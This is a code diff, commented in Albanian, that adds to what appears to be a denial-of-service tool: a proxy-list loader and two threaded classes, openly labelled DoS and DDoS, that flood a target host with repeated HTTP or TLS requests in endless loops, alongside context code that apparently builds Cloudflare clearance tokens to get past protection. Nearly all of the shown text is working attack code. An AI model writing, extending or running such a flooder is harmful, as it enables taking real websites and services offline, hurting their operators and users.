@@ -100,3 +100,57 @@ def generate_cf_token(i):
         cf_token.append(proxy[0] + "#" + proxy[1] + "#" + cookie_value_string + user_agent_string)
     except:
         pass  
+
+    # Leximi dhe shkrimi i të dhënave nga proxy fajlli ne proxy_list array
+def proxyget():
+    proxy_file = open(args.proxy_file, "r")
+    line = proxy_file.readline().rstrip()
+    while line:
+        proxy_list.append(line)
+        line = proxy_file.readline().rstrip()
+    proxy_file.close()
+
+
+# Klasa DoS në rastin kur serveri nuk është i pajisur me SSL/TLS certifikatë
+class RequestDefaultHTTP(threading.Thread):
+    def __init__(self, counter):
+        threading.Thread.__init__(self)
+        self.counter = counter
+    def run(self):
+        go.wait()
+        while True:
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.connect((str(args.host), int(args.port)))
+                s.send(str.encode(request))
+                print("Kërkesa është dërguar :", self.counter)
+                try:
+                    for y in range(150):
+                        s.send(str.encode(request))
+                except:
+                    s.close()
+            except:
+                s.close()
+
+# Klasa DDoS në rastin kur serveri është i pajisur me SSL/TLS certifikatë
+class RequestDefaultHTTPS(threading.Thread):
+    def __init__(self, counter):
+        threading.Thread.__init__(self)
+        self.counter = counter
+    def run(self):
+        go.wait()
+        while True:
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.connect((str(args.host), int(args.port)))
+                s = ssl.wrap_socket(s, keyfile=None, certfile=None, server_side=False, cert_reqs=ssl.CERT_NONE,
+                                    ssl_version=ssl.PROTOCOL_SSLv23)
+                s.send(str.encode(request))
+                print("Kërkesa është dërguar :", self.counter)
+                try:
+                    for y in range(150):
+                        s.send(str.encode(request))
+                except:
+                    s.close()
+            except:
+                s.close()
